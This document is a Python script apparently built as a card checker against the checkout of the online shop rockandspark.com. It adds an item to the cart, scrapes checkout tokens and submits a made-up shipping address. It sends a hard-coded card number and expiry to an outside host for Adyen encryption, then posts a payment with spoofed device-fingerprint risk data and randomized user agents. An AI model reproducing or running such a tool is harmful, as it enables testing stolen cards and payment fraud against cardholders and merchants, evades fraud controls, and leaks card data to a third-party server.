import aiohttp, uuid, traceback, json, os, urllib.parse
from faker import Faker
import asyncio


cc = "5307060439875850"
mes = "07"
ano = "28"

    
async def main():
    async with aiohttp.ClientSession() as session:
            fake = Faker()




            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'origin': 'https://rockandspark.com',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://rockandspark.com/products/double-undefined-stainless-steel-couple-rings?variant=4011',
                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': fake.user_agent(),
                'x-requested-with': 'XMLHttpRequest',
            }

            params = {
                '_t': '1730680681171',
            }

            json_data = {
                'items': [
                    {
                        'sku_sn': '10707SRBA60',
                        'qty': '1',
                        'options': [],
                    },
                ],
            }

            response = await session.post('https://rockandspark.com/cart/add', params=params, headers=headers, json=json_data,)
            r1 = await response.text()

            set_cookie = response.headers.get('Set-Cookie', '')

            cart_id = ''
            for part in set_cookie.split(';'):
                if part.strip().startswith('cart_id='):
                    cart_id = part.split('=')[1]
                    break

 


            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-419,es;q=0.7',
                # Requests sorts cookies= alphabetically
                'cookie': f'_abt_nscmk=1; _abt_sif=0_1730676365; _ay_sid=206352139935958163; cart_id={cart_id}',
                'priority': 'u=0, i',
                'referer': 'https://rockandspark.com/products/double-undefined-stainless-steel-couple-rings?variant=4011',
                'sec-ch-ua': '"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': fake.user_agent(),
            }

            response = await session.get('https://rockandspark.com/shopping/checkout', headers=headers)
            r1 = await response.text()


            with open("Adyen1.html", "w", encoding="utf-8") as f:
                f.write(r1)

            checkoutid = r1.split('"checkoutId":"')[1].split('"')[0]
            checkoutoken = r1.split('"checkoutToken":"')[1].split('"')[0]
            checkoutoken = checkoutoken.replace('\\', '')



            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'es-419,es;q=0.7',
                # Requests sorts cookies= alphabetically
                #'cookie': f'_abt_nscmk=1; _abt_sif=0_1730676365; _ay_sid=206352139935958163; cart_id={cart_id}; checkout_id={checkoutid}; _abt_vid=206352139935958163',
                'origin': 'https://rockandspark.com',
                'priority': 'u=1, i',
                'referer': 'https://rockandspark.com/shopping/checkout',
                'sec-ch-ua': '"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': fake.user_agent(),
                'x-requested-with': 'XMLHttpRequest',
            }

            params = {
                '_t': '1730676510308',
            }

            data = {
                'shipping[id]': '0',
            'shipping[province_code]': 'NJ',
            'shipping[country_code]': 'US',
            'shipping[first_name]': 'fasda',
            'shipping[last_name]': 'sadsad',
            'shipping[address1]': '2213 S Broadway Ave',
            'shipping[address2]': '',
            'shipping[city]': 'Orange',
            'shipping[province]': 'New Jersey',
            'shipping[zip_code]': '07050',
            'shipping[phone]': '45567872347',
            'shipping[email]': 'asdasdanj@gmail.com',
                'is_save': '1',
                'checkout_token': checkoutoken,
            }

            response = await session.post('https://rockandspark.com/shopping/save-address', params=params, headers=headers, data=data)
            r2 = await response.text()



            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'es-419,es;q=0.7',
                # Already added when you pass json=
                # 'content-type': 'application/json',
                # Requests sorts cookies= alphabetically
                # 'cookie': '_abt_nscmk=1; _abt_sif=0_1730676365; cart_id=1ae6e61b26f296323a60bd94c6c79489; _ay_sid=206359125756888240; _abt_vid=206359125756888240; checkout_id=4932610b9c0785dd978907b9516408c2; co_addr_cid=4932610b9c0785dd978907b9516408c2',
                'origin': 'https://rockandspark.com',
                'priority': 'u=1, i',
                'referer': 'https://rockandspark.com/shopping/checkout',
                'sec-ch-ua': '"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': fake.user_agent(),
                'x-requested-with': 'XMLHttpRequest',
            }

            params = {
                '_t': '1730679794033',
            }

            json_data = {
                'coupon_code': '',
                'gift_card_code': '',
                'checkout_token': checkoutoken,
                'tip_cost': 0,
                'shipping_code': 'standard',
                'payment_code': 'dBMsj1ZfcoZjv5',
                'meta_data': {
                    'tips_scale': '',
                },
                'access_token': 'OEM9MR8zd04rVhYcA0ddIBwbLCwVaHJrYwp5SS5fIi43Q2ovSTsxVmpWR0BUBgFtVHZsckR8cHF5RWFbehpzISoTIyBJaC5WOQRXSkAEDWRLdWl9X3N9Z3NCZEl0FCUuLgRyblplZkRmQ0NDVAAYdhcie39TaGRrNAU5SWIUOTM3ESNuRH0nGzMfFB4GRkQ1Fy93Jh4nZzkzGDEeO0IiaCcOJTYHN3gBPhAQFgtbUTBINy0kGCQkLDIEeBgsUzQrbgI/IRs+MFkiHRsXEQpCNRctOCsFd3x5cEZ3R3pFOCNhW2ApR3A5FSMAV0oZF10kR357dEh6ZnhxT3tSbRhjcnJDfHYfOzgRck5ER1EFAmxVcmx3XWg6L2NNd0l0FCQ1L0NqdgMmIQQjTlpfEFpXPwQqPTYBKzoibxQ6BndVMDU3TjM8DjE+GDkHAVJOF0c9AWZjdQw3NQ==',
            }

            response = await session.post('https://rockandspark.com/shopping/configure', params=params, headers=headers, json=json_data)
            r2 = await response.text()


            ordersn = r2.split('order_sn=')[1].split('&')[0]
            _sign = r2.split('_sign=')[1].split('"')[0]



            one = cc[:1]
            if one == "4":
                tipo = "visa"
            elif one == "5":
                tipo = "mc"
            elif one == "3":
                tipo = "amex"
            elif one == "6":
                tipo = "discover"



            ADYEN_KEY = "10001|F1D4556F61664CF1620D71C6500EE2A0FB4268B15737CD8C4F08472638D93CBC93206A84D09DFC6E27BF060B869182DCEAD8809EC61007EE0BEB70B8119D3AF9C161161DE0284C337FB008FE39E2CBCFAD9DCA8B9900A46EF6457620C620D5503E3038A124B1DA2292AEEF637251D9FCBA174511684EB31D6F42DBEDDCCA5E26D8EA0B60EDA6512622627169F6BC0D82788D150A19C121D11D9C641E3767758A7E90B6264AF5CEB59BF4AC2EA013C766DB4DCC51A75D4A5FA648EBD0E1E1CF33FF18C37C8122F64EF55A02510DEBE27894AD0A7054E592080AE1277D470D2BAF9CC2626424BE680DF839124A27E281812864A71833EE3ABEA33C4FAD2F256787"

            # enc = encryptor(ADYEN_KEY)
            # enc.adyen_version = '_0_1_25'
            # card = enc.encrypt_card(card=self.cc, cvv=self.cvv, month=self.mes, year=self.ano)
            # card = str(card)
            # ccencript = card.split("'card': '")[1].split("'")[0]
            # mesencript = card.split("'month': '")[1].split("'")[0]
            # anoencript = card.split("'year': '")[1].split("'")[0]

            # Nuevo método de encriptación
            headers = {
                'Content-Type': 'application/json'
            }
            post_data = {
                'cardNumber': cc,
                'expiryMonth': mes,
                'expiryYear': ano,
            }
            response = await session.post('https://asianprozyy.us/encrypt/adyen', headers=headers, data=json.dumps(post_data))
            result = await response.json()
            ccencript = result.get('encryptedCardNumber')
            mesencript = result.get('encryptedExpiryMonth')
            anoencript = result.get('encryptedExpiryYear')

            cvvencript =""


            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'es-419,es;q=0.7',
                # Already added when you pass json=
                # 'content-type': 'application/json',
                # Requests sorts cookies= alphabetically
                # 'cookie': '_abt_nscmk=1; _abt_sif=0_1730676365; _ay_sid=206352139935958163; cart_id=1ae6e61b26f296323a60bd94c6c79489; checkout_id=3b2a9e60fdd88f143c26c107b3b716ce; _abt_vid=206352139935958163; co_addr_cid=3b2a9e60fdd88f143c26c107b3b716ce',
                'origin': 'https://rockandspark.com',
                'priority': 'u=1, i',
                'referer': 'https://rockandspark.com/shopping/checkout',
                'sec-ch-ua': '"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': fake.user_agent(),
                'x-requested-with': 'XMLHttpRequest',
            }

            params = {
                'ajax': '1',
                'payment_code': 'dBMsj1ZfcoZjv5',
                'order_sn': ordersn,
                'checkout_id': checkoutid,
                '_sign': _sign,
            }

            json_data = {
                'riskData': {
                    'clientData': 'eyJ2ZXJzaW9uIjoiMS4wLjAiLCJkZXZpY2VGaW5nZXJwcmludCI6IlByR21ERURTS2MwMDQwMDAwMDAwMDAwMDAwMkozOEQ1NXVTRzAwNDgwNTE2NzJjVkI5NGlLekJHZG5YVm0xNkU0S3N3RXRMa0l0MTYwMDJZRFBHbWY0NERvMDAwMDBxWmtURTAwMDAwQkduQkZuWU10clFNeUJrZnhaTEo6NDAiLCJwZXJzaXN0ZW50Q29va2llIjpbIl9ycF91aWQ9OGEyM2Q1NmUtMzFjZi01YTI0LWNkNGYtZWMxM2FlMzQwYTE4Il0sImNvbXBvbmVudHMiOnsidXNlckFnZW50IjoiZTMzNmI3ZDE0YzVmNWRhOTVhNTQ5Mjc2YzE2Y2M4MjMiLCJ3ZWJkcml2ZXIiOjAsImxhbmd1YWdlIjoiZXMtNDE5IiwiY29sb3JEZXB0aCI6MjQsImRldmljZU1lbW9yeSI6MiwicGl4ZWxSYXRpbyI6MSwiaGFyZHdhcmVDb25jdXJyZW5jeSI6Nywic2NyZWVuV2lkdGgiOjE5MjAsInNjcmVlbkhlaWdodCI6MTAzMiwiYXZhaWxhYmxlU2NyZWVuV2lkdGgiOjE5MjAsImF2YWlsYWJsZVNjcmVlbkhlaWdodCI6MTAzMiwidGltZXpvbmVPZmZzZXQiOjMwMCwidGltZXpvbmUiOiJBbWVyaWNhL0xpbWEiLCJzZXNzaW9uU3RvcmFnZSI6MSwibG9jYWxTdG9yYWdlIjoxLCJpbmRleGVkRGIiOjEsImFkZEJlaGF2aW9yIjowLCJvcGVuRGF0YWJhc2UiOjAsInBsYXRmb3JtIjoiV2luMzIiLCJwbHVnaW5zIjoiN2IxYWFkMjcxZWNmYTQxOGE1OGE5OWEyODJjOWE5ZWYiLCJjYW52YXMiOiIxMTJiMGUxZGU4NGZmZGViMTEzNmY0MGM0MDBlNjE3OCIsIndlYmdsIjoiNTVmM2E1MzcyNjQzNjI5ZWJhODFhZDMwYzJlNTA2OTAiLCJ3ZWJnbFZlbmRvckFuZFJlbmRlcmVyIjoiR29vZ2xlIEluYy4gKE5WSURJQSl+QU5HTEUgKE5WSURJQSwgTlZJRElBIEdlRm9yY2UgR1RYIDE2NTAgKDB4MDAwMDFGOTEpIERpcmVjdDNEMTEgdnNfNV8wIHBzXzVfMCwgRDNEMTEpIiwiYWRCbG9jayI6MCwiaGFzTGllZExhbmd1YWdlcyI6MCwiaGFzTGllZFJlc29sdXRpb24iOjAsImhhc0xpZWRPcyI6MCwiaGFzTGllZEJyb3dzZXIiOjAsImZvbnRzIjoiMTBjYTFhNDA0MzU2M2JmOTgyNjAzMjM1M2E4ZTk3YTIiLCJhdWRpbyI6IjQ5Yjg3YzA4MmIwNjI0NTE2NGE5MDViM2JjZmIzZjY0IiwiZW51bWVyYXRlRGV2aWNlcyI6ImNmZTVmM2JiNzM2OTA5ZmUxYTVhZmU4MDFkOWMwMDJhIiwiaXAiOiIxOTAuMTA4Ljk1LjI1MSIsInZpc2l0ZWRQYWdlcyI6W3sicGF0aCI6Ii9jaGVja291dHNob3BwZXIvYXNzZXRzL2h0bWwvbGl2ZV9YUkZSS1ZDRUFGQ0Q1SVlKRUtTR0hETFZDUTRSQkRISy9kZnAuMS4wLjAuaHRtbCIsInZpc2l0ZWRBdCI6IjIwMjQtMTEtMDNUMjM6Mjg6MzQuMDIzWiJ9XX19',
                },
                'paymentMethod': {
                    'type': 'scheme',
                'holderName': 'asd sa da',
                    'encryptedCardNumber': ccencript,
                    'encryptedExpiryMonth': mesencript,
                    'encryptedExpiryYear': anoencript,
                    'brand': tipo,
                },
                'browserInfo': {
                    'acceptHeader': '*/*',
                    'colorDepth': 24,
                    'language': 'es-419',
                    'javaEnabled': False,
                    'screenHeight': 954,
                    'screenWidth': 1138,
                    'user-agent': fake.user_agent(),
                    'timeZoneOffset': 300,
                },
                'origin': 'https://rockandspark.com',
                'clientStateDataIndicator': True,
            }

            rep = await session.post('https://rockandspark.com/payment/complete', params=params, headers=headers, json=json_data)

            # Imprimir la respuesta
            print(await rep.text())




# Ejecutar la función main
asyncio.run(main())


